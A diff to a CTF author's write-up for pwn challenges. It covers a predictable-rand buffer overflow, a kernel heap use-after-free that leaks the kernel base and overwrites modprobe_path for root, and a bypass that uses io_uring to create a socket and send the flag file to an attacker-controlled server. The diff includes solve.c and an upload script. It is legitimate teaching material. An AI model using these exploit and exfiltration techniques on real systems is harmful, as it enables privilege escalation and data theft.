@@ -15,7 +15,7 @@ Hope You enjoyed the challenges.
 # God of Gamblers (50 points / 45 solves)
 ![Imgur](https://i.imgur.com/S3VTwBJ.png)
 
-This challenge is deisgned for beginner-friendly which doesn't require much exploit skill and technique. The challenge point is to understand that it is easy to predict the random value gerenarted by `srand(time(0))` and  `rand()`, and a little bit buffer overflow.
+This challenge is aimed for beginner-friendly which doesn't require much exploit skill and technique. The challenging point is to understand that it is easy to predict the random value gerenarted by `srand(time(0))` and  `rand()`, and a little bit buffer overflow.
 In this challenge, only the stripped binary provided. Here is the source code:
 ```c
 #include <stdio.h>
@@ -307,11 +307,12 @@ p.interactive()
 # Kernpass (430 points / 10 solves)
 ![Imgur](https://i.imgur.com/VxCl23a.png)
 
-Kernpass is a kernel pwn challenge. This is the first time I make a kernel pwn challegne, so it actually cost me so much time on compiling kernel, busybox and kernel module debugging.
+Kernpass is a kernel pwn challenge. This is the first time I make a kernel pwn challegne, so it actually cost me so much time on compiling kernel, busybox and kernel module debugging. To be honest, this is the very time for me to create a kernel pwnchallenge, amount of terrible permission misconfiguration leads to several unintended solution. I apologize for that.
 
-This challnege is a very classic "note-liked" heap challenge, it should be easy for the kernel pwn player. You may find that the challenge called "kernpass" but there are not any encryption or endcoding elements inside. In fact, in the very early stages of the idea, I did want to implement a complex encryption system on it. However, I found it difficult to solve on my own :( and the hard deadline is coming soon. So I keep it simple and didn't require complicated techinque to exploit.
+This challnege is a very classic "note-liked" heap challenge, it should be easy for the kernel pwn player. You may find that the challenge called "kernpass" but there are not any encryption or endcoding elements inside. In fact, in the very early stages of the idea, I did want to implement a complex encryption system on it. However, I found it difficult to solve on my own :( and the hard deadline is coming soon. So I keep it simple.
 
 I think it is a light work for kernel pwn player to reverse it, so I decided to provide the kernel module only.
+
 Here is the source code of the kernel module:
 ```c
 #include <linux/cdev.h>
@@ -460,9 +461,6 @@ static int module_open(struct inode *inode, struct file *filp) {
 }
 
 static int module_close(struct inode *inode, struct file *filp) {
-
-  /* Remove everything */
-  ///kfree(b_list);
   return 0;
 }
 
@@ -533,16 +531,16 @@ We can follow the following steps to leak kernel address
 Thread 1:
 1. Create a 0x20 size password, password #0
 2. register a uffd page
-3. Check password #0 using the uffd page to trigger user fault
+3. Check password #0 using the uffd page to trigger page fault
 
-Start thread 2:
+Thread 2 start:
 
 4. Delete password #0 
-5. Spray seq_operations [kmalloc-32 heap spray](https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628#seq_operations)
+5. Spray `seq_operations` [kmalloc-32 heap spray](https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628#seq_operations)
 
 Thread 2 end, thread 1 continue
 
-It return the data of seq_operations struture which reveal the kernel address. We can calculate the kernel base address by finding the offset manuelly.
+It return the data of `seq_operations` struture which reveal the kernel address. We can calculate the kernel base address by finding the offset manuelly.
 
 ## UAF - Arbitrary Address Write Primitive (AAW)
 As the structure size of password_entity 0x10, we are able to retrieve AAW through heap chunk overlapping.
@@ -550,14 +548,16 @@ As the structure size of password_entity 0x10, we are able to retrieve AAW throu
 Thread 1:
 1. Create a 0x10 size password, password #0
 2. register a uffd page
-3. Edit password #0 using the uffd page to trigger user fault and the address to what to write data in
+3. Edit password #0 using the uffd page to trigger page fault and prepare the address to write data in
 
-Start thread 2:
+Thread 2 start:
 
 4. Delete password #0
-5. Create two 0x10 size password, password #2 & #3
+5. Create two 0x20 size password, password #2 & #3
 
 Thread 2 end, thread 1 continue
+
+6. The pointer in password #3 will be overwritten with the address that we prepared in step3
 
 The easiest way to become root with knowing kernel base address and having AAW is to modify modprobe_path.
 
@@ -746,6 +746,7 @@ static void* fault_handler_thread(void *arg) {
 }
 
 int register_uffd(void *addr, size_t len) {
+  /* uffd template from https://pawnyable.cafe/ */
   struct uffdio_api uffdio_api;
   struct uffdio_register uffdio_register;
   long uffd;
@@ -842,9 +843,12 @@ int main(){
 
 The idea of this challenge is very simple, just banned `socket` syscall. Players are required to get the flag without using `socket` syscall.
 
-I want to keep the challenge simple and lightweight, I didn't spend many effort on the hardening. And of course, it also comes up several unintended solutions.
+I want to keep the challenge as lightweight as possible, I didn't implement so much on the hardening and it surely possible to come up with several unintended solutions.
 
-Actually my team thought this would be easy for many kernel pwner as `io_uring` is a hot topic in KCTF in recent years, so I rated it 3/5 difficulty in internal rating. To be honest, I am very shocked that only a solve on the challenge (the unintended solution from team shellphish with no mercy).
+In my team internal difficulty rating, we expected this would be a easy challenge for many expereinced pwners (especially kernel pwner) because of the hot topic of `io_uring` in KCTF in recent years.
+
+We are surprised that only one team solved it (an unintended solution from Shellphish's fork bomb with no mercy).
+
 
 ## Intended Solution
 https://manpages.debian.org/unstable/liburing-dev/io_uring_enter.2.en.html
@@ -867,11 +871,13 @@ The above snip is part of the strace result of a socket fd creation.
 
 Once we have a socket fd, the rest of stuffs are a piece of cake.
 
-`read flag -> create io_uring socket -> connect to remote -> send flag -> solved`
+`open flag -> read flag -> create io_uring socket -> connect to your public server or webhook -> send flag -> solved`
 
 ## Exploit Script
 You can retrieve the flag via listening on your public accessible machine or webhook services (e.g. requestbin)
-```
+
+> solve.c
+```c
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -912,10 +918,6 @@ int main(int argc , char *argv[])
     io_uring_wait_cqe(&ring, &cqe);
 
     int sockfd = cqe->res;
-    if (sockfd == -1){
-        printf("Fail to create a socket.");
-    }
-
 
     strcat(message, "GET /");
     strcat(message, flag);
@@ -933,12 +935,25 @@ int main(int argc , char *argv[])
     info.sin_port = htons(port);
 
     int err = connect(sockfd, (struct sockaddr *)&info, sizeof(info));
-    if(err==-1){
-        printf("Connection error");
-    }
-
     send(sockfd, message, 0x100,0);
 
     return 0;
 }
+
+```
+> upload.py
+```python
+from pwn import *
+
+r = remote("chall-us.pwnable.hk", 20003)
+with open("solve", 'rb') as file:
+    data = file.read()
+
+file_size = len(data)
+print(f"file size: {file_size}")
+r.sendline(str(file_size))
+sleep(1)
+print("Upload data")
+r.send(data)
+sleep(10)
 ```
